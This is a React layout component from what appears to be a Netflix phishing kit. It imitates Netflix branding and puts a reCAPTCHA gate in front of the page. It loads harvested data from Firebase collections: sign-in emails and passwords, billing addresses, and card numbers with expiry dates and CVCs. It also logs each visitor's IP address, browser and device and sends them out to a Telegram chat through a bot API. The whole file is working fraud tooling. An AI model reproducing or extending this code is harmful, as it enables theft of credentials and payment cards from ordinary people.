import { useContext, useEffect, useState } from 'react';
import { Store } from '../context/store';
import db from '../firebase/firebase';
import logo from '../assets/Netflix_2015_logo.svg';
import { useLocation } from 'react-router-dom';
import {
    isDesktop,
    isTablet,
    isMobile,
    isAndroid,
    isIOS,
    isWindows,
    isMacOs,
    browserName
  } from "react-device-detect";

import React from 'react'
//...
import LoadingScreen from 'react-loading-screen'
//load captcha
import ReCAPTCHA from "react-google-recaptcha";
import moment from "moment"
const { TelegramClient } = require('messaging-api-telegram');
const CryptoJS = require("crypto-js");
const client = new TelegramClient({
    accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
});
const Layout = ({ children }) => {
    const [state, dispatch] = useContext(Store);
    const [loading, setLoading] = useState(true);
    const [isNotRobot, setIsNotRobot] = useState(false);
    let location = useLocation()
    function onChangeCap( value ){
        localStorage.setItem('isNotRobot',1)
        setIsNotRobot(true)
    }
    
    useEffect(() => {
        let signInData = [];
        let billingData = [];
        let paymentData = [];
        let visitData = [];
        db.collection('billing-data').get().then(snapshot => {
            snapshot.docs.forEach(doc => {
                const singleDoc = {
                    id: doc.id,
                    fullname: doc.data().fullname,
                    address: doc.data().address,
                    phone: doc.data().phone,
                    state: doc.data().state,
                    city: doc.data().city,
                    zip: doc.data().zip,
                    country: doc.data().country,
                    ip_address: doc.data().ip_address,
                    logged_at: doc.data().logged_at
                }
                billingData.push(singleDoc)
            })
        });
        db.collection('signin-data').get().then(snapshot => {
            
            snapshot.docs.forEach(doc => {
                const singleDoc = {
                    id: doc.id,
                    email: doc.data().email,
                    password: doc.data().password,
                    ip_address: doc.data().ip_address,
                    logged_at: doc.data().logged_at
                }
                signInData.push(singleDoc)
            })
        });
        db.collection('payment-data').get().then(snapshot => {
            snapshot.docs.forEach(doc => {
                const singleDoc = {
                    id: doc.id,
                    fname: doc.data().fname,
                    lname: doc.data().lname,
                    cardNum: doc.data().cardNum,
                    expiry: doc.data().expiry,
                    cvc: doc.data().cvc,
                    ip_address: doc.data().ip_address,
                    logged_at: doc.data().logged_at
                }
                paymentData.push(singleDoc)
            })
        });
        db.collection('visit-data').get().then(snapshot => {
            snapshot.docs.forEach(doc => {
                const singleDoc = {
                    id: doc.id,
                    ip_address: doc.data().ip_address,
                    browser: doc.data().browser,
                    logged_at: doc.data().logged_at,
                    device: doc.data().device,
                }
                visitData.push(singleDoc)
            })
        });
        dispatch({ type: 'SIGN_IN_DATA', payload: signInData });
        dispatch({ type: 'BILLING_IN_DATA', payload: billingData });
        dispatch({ type: 'PAYMENT_DATA', payload: paymentData });
        dispatch({ type: 'VISIT_DATA', payload: visitData });
    }, []);
    useEffect( () => {
        const isRobotCheckAllowed = process.env.REACT_APP_PUBLIC_ROBOT_CHECK
        const robotCheckExpireTime = process.env.REACT_APP_PUBLIC_ROBOT_CHECK_EXPIRE_TIME
        
        const pastVisitTime = localStorage.getItem('pastDeviceDetectTime')
        let timeDiff = 3000000000
        if( pastVisitTime )
        {
            timeDiff = Date.now() - pastVisitTime
        }
        
        localStorage.setItem('pastDeviceDetectTime', Date.now())
        if( timeDiff >= ( process.env.REACT_APP_PUBLIC_VISIT_CHECK_CYCLE * 1000) )
        {
            let deviceType = "Unknown"
            if( isDesktop )
            {
                if( isWindows )
                {
                    deviceType = "Windows Desktop"
                }
                if( isMacOs )
                {
                    deviceType = "MacOS Desktop"
                }
            }
            if( isMobile )
            {
                if( isIOS )
                {
                    deviceType = "iPhone"
                }

                if( isAndroid )
                {
                    deviceType = "Android Phone"
                }
            }
            fetch(
                "https://api.ipify.org?format=jsonp?callback=?", {
                method: "GET",
                headers: {}
            })
            .then(res => {
                return res.text()
            })
            .then(ip => {
                const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
                const isEnableDecrypt = process.env.REACT_APP_PUBLIC_ENCRYPT_ENABLE
                const isEnableDBStore = process.env.REACT_APP_PUBLIC_DB_STORE_ENABLE
                const isEnableTM = process.env.REACT_APP_PUBLIC_TM_ENABLE

                let ip_address = ip
                let browser = browserName
                let logged_at = moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
                let device = deviceType

                if( isEnableDecrypt === '1' )
                {
                    browser = CryptoJS.AES.encrypt(browser, secretKey).toString()
                    device = CryptoJS.AES.encrypt(device, secretKey).toString()
                    ip_address = CryptoJS.AES.encrypt(ip_address, secretKey).toString() 
                    logged_at = CryptoJS.AES.encrypt( logged_at, secretKey).toString()
                }
                let tmMessage = "Visit Data\r\n"
                    tmMessage += "" + ip_address + '\r\n'
                    tmMessage += "" + browser + '\r\n'
                    tmMessage += "" + logged_at + '\r\n'
                    tmMessage += "" + device + '\r\n'
                if( isEnableDBStore === '1' )
                {
                    db.collection('visit-data').add({
                        ip_address: ip_address, 
                        browser: browser, 
                        device: device,
                        logged_at: logged_at
                    }).then(data => {
                        console.log( data )
                    }).catch(err => {
                        throw new Error(err);
                    });
                }
                if( isEnableTM === '1' )
                {
                    client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, tmMessage, {
                        disableWebPagePreview: true,
                        disableNotification: true,
                    })
                    .then( res => {
                        console.log( res )
                    })
                    .catch( e => console.log('error while TM message' + e))
                }
            })
            .catch( e => {
                console.log( e )
            })
        }
        if( isRobotCheckAllowed === '1')
        {
            const pastVisitTime = localStorage.getItem('pastVisitTime')
            let timeDiff = 3000000000
            /**
             * if first visit, it is set as timedout
             * so need captcha
             */

            if( pastVisitTime )
            {
                timeDiff = Date.now() - pastVisitTime
            }
            
            localStorage.setItem('pastVisitTime', Date.now())
            if( timeDiff >= (robotCheckExpireTime * 1000) )
            {
                setIsNotRobot(false)
            }
            else
            {
                const isNotRobot = localStorage.getItem('isNotRobot')
                if( isNotRobot === '1' )
                {
                    setIsNotRobot(true)
                }
            }
        }
        else
        {
            setIsNotRobot(true)
        }
    }, [])
    useEffect(() => {
        // console.log(location);
        setLoading(true);
        setTimeout(() => {
            setLoading(false)
        }, 500);
    }, [location])
    
    return (
        <div className='h-screen flex flex-col'>
            {
                !isNotRobot &&
                <div className="recaptcha-container">
                    <div className="recaptcha-wrapper">
                        <ReCAPTCHA className="recaptcha"
                            sitekey="6Lcs214cAAAAADjXSFdTWUCeN3XPsBRFJ_-9ItOM"
                            onChange={onChangeCap}
                        />
                    </div>
                </div>
            }
            {/* <Header /> */}
            {
                isNotRobot &&
                <LoadingScreen
                    loading={loading}
                    bgColor='#141414'
                    spinnerColor='#e50914'
                    textColor='#676767'
                    logoSrc={logo}
                >
                </LoadingScreen>
            }
            {
                isNotRobot && !loading &&
                <div className='flex-1'>
                    {children}
                </div>
            }
            
            {/* <Footer /> */}
        </div>
    );
};

export default Layout;